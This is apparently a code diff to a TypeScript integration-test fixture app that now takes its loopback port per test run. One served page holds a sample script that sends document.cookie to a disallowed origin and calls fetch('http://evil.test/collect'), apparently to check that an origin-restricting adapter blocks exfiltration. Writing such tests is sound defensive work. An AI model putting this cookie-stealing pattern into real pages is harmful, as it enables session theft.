@@ -1,11 +1,11 @@
 import { randomBytes } from 'node:crypto';
 import http from 'node:http';
-import { FIXTURE_ORIGIN, FIXTURE_PORT } from './registry/constants.js';
+import { fixtureOrigin, fixturePort } from './run-context.js';
 
 /*
- * A tiny application for the integration tests. It listens on a fixed loopback port because
- * the fixture adapter's allowed origin must be a static string. `http://localhost:<port>` is
- * the same server under an origin the adapter does NOT allow.
+ * A tiny application for the integration tests. It listens on a loopback port chosen once per
+ * test run (test/global-setup.ts), which is also the port in the fixture adapter's allowed
+ * origin. `http://localhost:<port>` is the same server under an origin the adapter does NOT allow.
  */
 
 export interface Hit {
@@ -50,7 +50,7 @@ export async function startFixtureApp(): Promise<FixtureApp> {
   const loginSuccesses: string[] = [];
 
   const server = http.createServer((request, response) => {
-    const url = new URL(request.url ?? '/', FIXTURE_ORIGIN);
+    const url = new URL(request.url ?? '/', fixtureOrigin());
     hits.push({
       host: request.headers.host ?? '',
       path: url.pathname,
@@ -113,7 +113,7 @@ export async function startFixtureApp(): Promise<FixtureApp> {
       case '/redirect-path':
         return redirect('/admin');
       case '/redirect-origin':
-        return redirect(`http://localhost:${FIXTURE_PORT}/orders`);
+        return redirect(`http://localhost:${fixturePort()}/orders`);
       case '/go-login':
         return redirect('/login');
       case '/meta-refresh':
@@ -126,7 +126,7 @@ export async function startFixtureApp(): Promise<FixtureApp> {
         return html(
           `<script>
             const img = new Promise((r) => { const i = new Image(); i.onload = r; i.onerror = r;
-              i.src = 'http://localhost:${FIXTURE_PORT}/pixel?c=' + document.cookie; });
+              i.src = 'http://localhost:${fixturePort()}/pixel?c=' + document.cookie; });
             const f = fetch('http://evil.test/collect').catch(() => null);
             Promise.all([img, f]).then(() => {
               document.body.insertAdjacentHTML('beforeend', '<div id="done">done</div>');
@@ -144,11 +144,11 @@ export async function startFixtureApp(): Promise<FixtureApp> {
 
   await new Promise<void>((resolve, reject) => {
     server.once('error', reject);
-    server.listen(FIXTURE_PORT, '127.0.0.1', () => resolve());
+    server.listen(fixturePort(), '127.0.0.1', () => resolve());
   });
 
   return {
-    origin: FIXTURE_ORIGIN,
+    origin: fixtureOrigin(),
     hits,
     loginSuccesses,
     addSession: (token, account) => sessions.set(token, account),
